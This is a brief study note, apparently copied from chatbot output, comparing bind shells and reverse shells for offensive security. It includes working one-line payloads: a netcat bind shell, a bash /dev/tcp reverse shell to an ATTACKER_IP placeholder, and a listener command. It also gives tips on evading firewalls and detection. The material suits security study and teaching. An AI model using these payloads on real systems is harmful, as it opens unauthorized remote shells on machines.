
### Reverse v Bind Shell.
-------------
## 1. Bind Shell

- **Listener location**: Runs on the **target** machine.
    
- **How it works**:
    
    1. The target executes a payload that binds a shell to a TCP port (e.g. `nc -lvp 4444 -e /bin/sh`).
        
    2. The attacker initiates a connection to the target’s listening port:
        
        bash
        
        CopyEdit
        
        `nc TARGET_IP 4444`
        
- **Pros**:
    
    - Simpler setup on the attacker side.
        
- **Cons**:
    
    - Target must have its firewall port open/forwarded.
        
    - Easier for defenders to spot an unexpected listener on the target.
        

---

## 2. Reverse Shell

- **Listener location**: Runs on the **attacker** machine.
    
- **How it works**:
    
    1. The attacker sets up a listener:
        
        bash
        
        CopyEdit
        
        `nc -lvnp 4444`
        
    2. The target executes a payload that “connects back” to the attacker’s IP and port:
        
        bash
        
        CopyEdit
        
        `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`
        
- **Pros**:
    
    - Bypasses firewalls/NAT on the target side (outbound is often allowed).
        
    - Less noisy on the target (no open listening port).
        
- **Cons**:
    
    - Attacker must be reachable (public IP, VPN, port-forwarding).
        

---

## 3. Side-by-Side Comparison

|Aspect|Bind Shell|Reverse Shell|
|---|---|---|
|Who listens?|**Target**|**Attacker**|
|Who connects?|**Attacker → Target**|**Target → Attacker**|
|Firewall/NAT issue?|Requires inbound access to target|Requires outbound access from target (usually easier)|
|Detection surface|Opens a new listening port on target|Often slips through, no new listener on target|
|Typical payload|`nc -lvp PORT -e /bin/sh`|`bash -i >& /dev/tcp/IP/PORT 0>&1`|

---

### When to Use Which

- **Bind shell**:
    
    - When the target is on a network segment you control and firewalls permit inbound traffic.
        
- **Reverse shell**:
    
    - When the target is behind NAT/firewall and only outbound connections are allowed.